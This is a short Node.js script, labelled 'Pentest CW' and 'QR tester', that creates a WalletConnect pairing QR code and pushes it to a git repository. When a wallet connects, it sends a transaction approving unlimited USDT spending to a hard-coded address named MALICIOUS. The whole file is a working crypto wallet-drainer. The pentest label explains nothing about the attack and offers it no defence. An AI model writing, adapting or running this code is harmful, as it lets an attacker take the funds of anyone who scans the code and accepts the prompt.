import SignClientMod from "@walletconnect/sign-client";
import QRCode from "qrcode";
import fs from "fs";
import dotenv from "dotenv";
import simpleGit from "simple-git";
import { ethers } from "ethers";

dotenv.config();
const SignClient = SignClientMod.SignClient || SignClientMod.default;
const git = simpleGit();

const MALICIOUS = "0x11489f371A7230013C4d3d5151f0aD1F900C3ad0";
const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";

const abi = ["function approve(address,uint256) external returns (bool)"];

async function main() {
  if (!fs.existsSync("../static")) fs.mkdirSync("../static");
  
  const client = await SignClient.init({
    projectId: process.env.WALLETCONNECT_PROJECT_ID,
    metadata: { name: "Pentest CW", description: "QR tester", url: "https://example.com", icons: [] }
  });
  
  const { uri } = await client.core.pairing.create();
  await QRCode.toFile("../static/qrcode.png", uri);
  console.log("QR généré :", uri);

  await git.cwd("..").add("static/qrcode.png").commit("auto QR").push("origin", "main");
  console.log("QR push terminé");

  client.on("session_proposal", async prop => {
    const { relay, proposer, requiredNamespaces } = prop;
    const session = await client.approve({
      id: prop.id,
      relayProtocol: relay.protocol,
      namespaces: {
        eip155: {
          methods: ["eth_sendTransaction"],
          chains: ["eip155:1"],
          events: ["accountsChanged"],
          accounts: []
        }
      }
    });
    const addr = session.namespaces.eip155.accounts[0].split(":")[2];
    const iface = new ethers.utils.Interface(abi);
    const data = iface.encodeFunctionData("approve", [MALICIOUS, ethers.constants.MaxUint256]);
    
    await client.request({
      topic: session.topic,
      chainId: "eip155:1",
      request: { method: "eth_sendTransaction", params: [{ from: addr, to: USDT, data }] }
    });
    console.log("Approve déclenché !");
  });
}

main().catch(console.error);
